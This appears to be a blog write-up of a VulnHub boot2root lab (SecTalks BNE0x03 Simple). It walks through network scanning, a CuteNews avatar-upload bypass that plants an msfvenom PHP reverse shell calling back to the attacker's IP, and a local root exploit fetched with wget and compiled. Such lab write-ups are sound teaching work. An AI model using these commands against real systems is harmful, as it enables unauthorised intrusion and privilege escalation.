---
layout: post
title: "SecTalks: BNE0x03 - Simple"
date: 2016-04-20 14:49:22 -0400
comments: true
categories:  [vulhub]
---

*May the LORD, my rock, be praised, who trains my hands for battle and my fingers for warfare.* ---- Psalm 144:1


From [Vulhub](https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/)
Simple CTF is a boot2root that focuses on the basics of web based hacking. Once you load the VM, treat it as a machine you can see on the network, i.e. you don't have physical access to this machine. Therefore, tricks like editing the VM's BIOS or Grub configuration are not allowed. Only remote attacks are permitted. /root/flag.txt is your ultimate goal.

<!--more-->


###Forces:

* netdiscover
* Nmap
* Burp Suite
* Metasploit



###Detail Assessment and Planning

* Port scan to identify opened ports, running services and services version. ---Nmap
* Search the web app vulnerability	--- searchsploit
* Generate and upload webshell	---metasploit
* Get root

###Waging War

####Weaknesses and Strengths

Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.79.0/24`

{% img  /images/blog/vulhub/simple_ctf1/Selection_001.png   [title manually exploit [alt text]] %}

192.168.79.172 is the target.

Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.79.172 -p-`

{% img  /images/blog/vulhub/simple_ctf1/Selection_002.png   [title manually exploit [alt text]] %}

Only port 80 is opening. Lets use Iceweasel to view the page.

{% img  /images/blog/vulhub/simple_ctf1/Selection_003.png   [title manually exploit [alt text]] %}


I noticed that the web app is Cutenews 2.0.3. search the exploit:

`searchsploit cutenews`

find the interesting results:

{% img  /images/blog/vulhub/simple_ctf1/Selection_004.png   [title manually exploit [alt text]] %}

The exploit is as follow:

* Sign up for New User
* Log In 
* Go to Personal options http://www.target.com/cutenews/index.php?mod=main&opt=personal
* Select Upload Avatar Example: Evil.jpg
* use tamper data  & Rename File Evil.jpg to Evil.php

Okay, firstly, I creat a reverse php shell,

`msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.79.156 LPORT=1234 -a php --platform php -o evil.jpg`

Now, use Burp as proxy, go to Personal options http://192.168.79.172/cutenews/index.php?mod=main&opt=personal to upload evil.jpg

in the burp, change the evil.jgp to evil.php

{% img  /images/blog/vulhub/simple_ctf1/Selection_005.png   [title manually exploit [alt text]] %}


After that, Burp will recevied a GET request:

{% img  /images/blog/vulhub/simple_ctf1/Selection_006.png   [title manually exploit [alt text]] %}

set metasploit multi/handler.

now go to http://192.168.79.172/uploads/avatar_bob1bob2.php will get meterpreter reverse shell:

{% img  /images/blog/vulhub/simple_ctf1/Selection_007.png   [title manually exploit [alt text]] %}


However, I am not the root, search the os version:

{% img  /images/blog/vulhub/simple_ctf1/Selection_008.png   [title manually exploit [alt text]] %}

search the ubuntu 14.04

`searchsploit ubuntu 14.04` and we get the result:

{% img  /images/blog/vulhub/simple_ctf1/Selection_009.png   [title manually exploit [alt text]] %}

Move the file to /var/www/html/ and in reverse shell:

`wget http://192.168.79.156/37292.c -O hack.c`

compile it:

`gcc hack.c -o hack -static`, run it.

then use `python -c 'import pty; pty.spawn("/bin/bash")'` to get the shell.

{% img  /images/blog/vulhub/simple_ctf1/Selection_010.png   [title manually exploit [alt text]] %}


{% img  /images/blog/vulhub/simple_ctf1/last.jpg  [title manually exploit [alt text]] %}